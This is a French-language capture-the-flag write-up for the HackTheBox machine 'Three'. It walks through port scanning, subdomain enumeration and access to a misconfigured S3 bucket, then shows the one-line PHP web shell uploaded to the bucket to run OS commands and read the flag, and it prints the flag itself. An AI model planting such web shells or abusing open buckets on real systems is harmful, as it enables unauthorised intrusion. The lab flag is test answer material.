# Write-up -- HackTheBox : Three
 
Write-up réalisé pour la machine Three de HackTheBox. L'objectif est d'exploiter un bucket S3 AWS dont les permissions (ACL) sont mal configurées pour obtenir un accès en écriture et y déposer un web shell.
 
L'IP de la machine pendant ma session était `10.129.83.117`.
 
---
 
## 1. Scan des ports ouverts
 
On commence par un scan nmap pour voir ce qui tourne sur la machine :
 
```bash
nmap -sV -sS 10.129.83.117
```
 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
 
**2 ports TCP ouverts** : SSH sur le 22 et un serveur web Apache sur le 80.
 
---
 
## 2. Identification du domaine
 
En visitant le site sur le port 80, on trouve une section "Contact" qui contient une adresse email : `mail@thetoppers.htb`.
 
Le domaine est donc **thetoppers.htb**.
 
---
 
## 3. Résolution du nom de domaine
 
Sans serveur DNS, on ajoute le domaine manuellement dans `/etc/hosts` :
 
```bash
sudo nano /etc/hosts
```
 
On y ajoute la ligne :
 
```
10.129.83.117   thetoppers.htb
```
 
---
 
## 4. Énumération des sous-domaines
 
J'ai d'abord essayé avec `ffuf` mais ça n'a rien donné. J'ai ensuite utilisé `gobuster` en mode vhost :
 
```bash
gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```
 
```
s3.thetoppers.htb         Status: 404 [Size: 21]
gc._msdcs.thetoppers.htb  Status: 400 [Size: 306]
```
 
Le sous-domaine intéressant est **s3.thetoppers.htb**. Les entrées avec le status 400 sont des artefacts sans intérêt. On l'ajoute aussi à `/etc/hosts` :
 
```
10.129.83.117   thetoppers.htb s3.thetoppers.htb
```
 
---
 
## 5. Identification du service
 
Le préfixe `s3` est un indice évident : il s'agit d'un **bucket Amazon S3**, un service de stockage objet dans le cloud AWS. 
 
---
 
## 6. Installation et configuration de l'AWS CLI
 
L'outil en ligne de commande pour interagir avec S3 est `awscli` :
 
```bash
sudo apt install awscli
```
 
Avant de pouvoir l'utiliser, il faut le configurer. Les credentials n'ont pas besoin d'être valides ici, n'importe quelle valeur suffit pour interagir avec un service mal configuré :
 
```bash
aws configure
# Mettre "tmp" pour tout ce qui est demandé
```
 
---
 
## 7. Exploration du bucket S3
 
On liste le contenu du bucket en pointant l'endpoint vers notre sous-domaine local :
 
```bash
aws --endpoint-url http://s3.thetoppers.htb/ s3 ls s3://thetoppers.htb
```
 
```
                           PRE images/
2026-04-17 12:13:19          0 .htaccess
2026-04-17 12:13:19      11952 index.php
```
 
On a les droits de lecture, et on voit un fichier `index.php` : le serveur web tourne donc en **PHP**. C'est lui qui sert le contenu du bucket sur `thetoppers.htb`.
 
---
 
## 8. Exploitation : Upload d'un web shell
 
Puisqu'on a probablement aussi les droits d'écriture (c'est l'objet de la mauvaise configuration ACL), on prépare un web shell PHP :
 
Contenu de `shell.php` :
```php
<?php system($_GET["cmd"]); ?>
```
 
Ce shell permet d'exécuter n'importe quelle commande OS via le paramètre `cmd` dans l'URL. On l'upload dans le bucket :
 
```bash
aws --endpoint-url http://s3.thetoppers.htb/ s3 cp shell.php s3://thetoppers.htb
```
 
```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```
 
L'upload a réussi. On vérifie que le fichier est bien accessible via le web :
 
```
http://thetoppers.htb/shell.php?cmd=ls
```
 
Ça retourne le listing du répertoire courant donc le shell fonctionne.
 
---
 
## 9. Récupération du flag
 
On cherche le fichier de flag. En explorant le système on trouve qu'il est dans `/var/www/` :
 
```
http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
```
 
**Flag :** `a980d99281a28d638ac68b9bf9453c2b`
 
---
